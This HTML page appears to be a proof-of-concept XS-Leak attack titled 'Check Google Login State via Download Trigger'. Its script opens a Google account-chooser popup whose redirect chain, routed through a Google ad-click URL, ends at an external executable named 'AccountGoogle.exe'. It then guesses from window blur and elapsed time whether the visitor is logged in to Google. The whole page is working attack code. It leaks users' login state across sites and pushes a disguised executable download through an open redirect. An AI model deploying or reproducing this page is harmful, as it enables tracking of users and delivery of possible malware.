<!DOCTYPE html>
<html>
<head>
  <title>XS-Leak Download Detection</title>
</head>
<body>
  <h1>Check Google Login State via Download Trigger</h1>
  <button onclick="startCheck()">Start XS-Leak</button>

  <p id="status">Waiting...</p>

  <script>
    let popup;
    let blurDetected = false;

    function startCheck() {
      document.getElementById('status').innerText = "Checking... Click popup if required";

      const googlePopupURL = "https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F";

      // Open popup targeting the Google account chooser + file download
      popup = window.open(
        googlePopupURL,
        "GoogleLoginPopup",
        "width=500,height=600"
      );

      // Listen for blur event on attacker window (user may be interacting with download bar)
      window.onblur = () => {
        blurDetected = true;
        console.log("Blur detected! Possible download triggered.");
      };

      // Monitor popup close and infer behavior
      const startTime = performance.now();
      const popupMonitor = setInterval(() => {
        if (popup.closed) {
          clearInterval(popupMonitor);
          const endTime = performance.now();
          const elapsed = endTime - startTime;

          let message = "❌ User NOT logged in (no download or no interaction).";

          if (blurDetected || elapsed > 2000) {
            message = "✅ User likely LOGGED IN → Download triggered (blur detected or long wait).";
          }

          document.getElementById('status').innerText = message;

          // Reset
          window.onblur = null;
        }
      }, 500);
    }
  </script>
</body>
</html>
